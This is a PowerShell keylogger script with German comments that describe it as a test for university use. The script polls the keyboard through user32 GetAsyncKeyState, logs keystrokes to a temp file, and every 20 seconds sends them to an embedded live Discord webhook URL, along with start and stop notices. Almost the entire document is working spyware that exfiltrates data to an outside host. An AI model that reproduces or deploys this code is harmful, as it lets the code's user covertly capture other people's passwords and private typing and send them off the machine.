# PowerShell Keylogger & Discord-Webhook-Sender mit Timeout (z.B. für Uni-Test)
Add-Type -TypeDefinition @"
using System;
using System.Runtime.InteropServices;
public class Keyboard
{
    [DllImport("user32.dll")]
    public static extern short GetAsyncKeyState(int vKey);
}
"@

$logFile = "$env:TEMP\key.log"
$hookUrl = "https://discord.com/api/webhooks/1433072215401824358/f95HWyiUinYpyysS0MA7NUuSPFs1Ute71SLQ0hEYYvebxsCoQam850qtTGwHRDbR2yg3"

# Zeitmessung beginnen
$start = Get-Date
$timeout = 120 # Sekunden

# Logger-Start an Discord melden
try {
    Invoke-RestMethod -Uri $hookUrl -Method Post -Body (@{content="[Logger] gestartet: $(Get-Date -Format o)"}|ConvertTo-Json) -ContentType "application/json"
} catch {}

function Get-KeyChar {
    param($char)
    $shift = ([Keyboard]::GetAsyncKeyState(16) -ne 0) # Shift-Key
    $caps = ([Keyboard]::GetAsyncKeyState(20) -ne 0) # CapsLock
    if ($char -ge 65 -and $char -le 90) { # A-Z
        if ($shift -xor $caps) {
            return [char]$char
        } else {
            return ([char]($char + 32)) # a-z
        }
    } elseif ($char -ge 48 -and $char -le 57) { # 0-9
        if ($shift) {
            $shiftNums = @(')','!','"','#','$','%','&','/','(','=')
            return $shiftNums[$char-48]
        } else {
            return [char]$char
        }
    } else {
        # Standardzeichen, rudimentär für DE-Layout
        $deSpec = @{44=';';46=',';45='-';47='#';59='ö';91='ü';93='ä';92='ß'}
        if ($deSpec.ContainsKey($char)) {
            return $deSpec[$char]
        } else {
            return [char]$char
        }
    }
}

while ($true) {
    $elapsed = (Get-Date) - $start
    if ($elapsed.TotalSeconds -ge $timeout) {
        break
    }
    foreach ($char in 32..126) {
        if ([Keyboard]::GetAsyncKeyState($char) -eq -32767) {
            $key = Get-KeyChar $char
            Add-Content -Path $logFile -Value $key
        }
    }
    if ((Get-Date).Second % 20 -eq 0) {
        if (Test-Path $logFile) {
            $keylog = Get-Content $logFile -Raw
            if ($keylog.Trim().Length -gt 0) {
                try {
                    Invoke-RestMethod -Uri $hookUrl -Method Post -Body (@{content=$keylog}|ConvertTo-Json) -ContentType "application/json"
                } catch {}
                Clear-Content $logFile
            }
        }
        Start-Sleep -Seconds 1
    } else {
        Start-Sleep -Milliseconds 40
    }
}
if (Test-Path $logFile) {
    $keylog = Get-Content $logFile -Raw
    if ($keylog.Trim().Length -gt 0) {
        try {
            Invoke-RestMethod -Uri $hookUrl -Method Post -Body (@{content=$keylog}|ConvertTo-Json) -ContentType "application/json"
        } catch {}
        Clear-Content $logFile
    }
}
try {
    Invoke-RestMethod -Uri $hookUrl -Method Post -Body (@{content="[Logger] beendet: $(Get-Date -Format o)"}|ConvertTo-Json) -ContentType "application/json"
} catch {}
